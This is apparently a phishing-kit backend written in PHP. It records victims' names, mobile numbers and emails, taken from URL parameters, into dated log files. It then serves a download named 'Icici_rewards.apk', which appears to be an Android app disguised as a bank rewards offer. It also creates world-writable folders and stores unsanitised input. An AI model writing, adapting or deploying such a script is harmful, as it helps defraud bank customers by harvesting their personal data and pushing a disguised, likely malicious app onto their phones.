<?php

$name = $_GET['name'];
$mobile = $_GET['mobile'];
$email = $_GET['email'];

if (isset($name) && isset($mobile) && isset($email)){
	
	$data_to_save = "---------------------------------------\nName = ".$name."\nMobile = ".$mobile."\nEmail = ".$email."\n\n";
	
	$mydate=getdate(date("U"));

	$folder_month = "$mydate[month]";
	$folder_year = "$mydate[year]"."/";

	$folder_name = $folder_month . "_" .$folder_year;

	if (!file_exists($folder_name)) {

		if (mkdir($folder_name, 0777, true)) {
			
			$myfile = fopen("$folder_name". date("Y_m_d") ."_file.txt", "a") or die("Unable to open file!");
			$txt = $data_to_save;
			fwrite($myfile, $txt. "\n");
			fclose($myfile);
			
		}else{
			die('Failed to create directories...');
		}

	}else{
		
		$myfile = fopen("$folder_name". date("Y_m_d") ."_file.txt", "a") or die("Unable to open file!");
		$txt = $data_to_save;
		fwrite($myfile, $txt. "\n");
		fclose($myfile);
		
	}
	
}

	if(isset($_GET['file'])){
		header("Content-type: application/vnd.android.package-archive");
		header("Content-Disposition: attachment; filename=Icici_rewards.apk");
		readfile('download.txt');
		sleep(3);
		
		//header('Location: redi.html'); //exit();
		//die;
	}
?>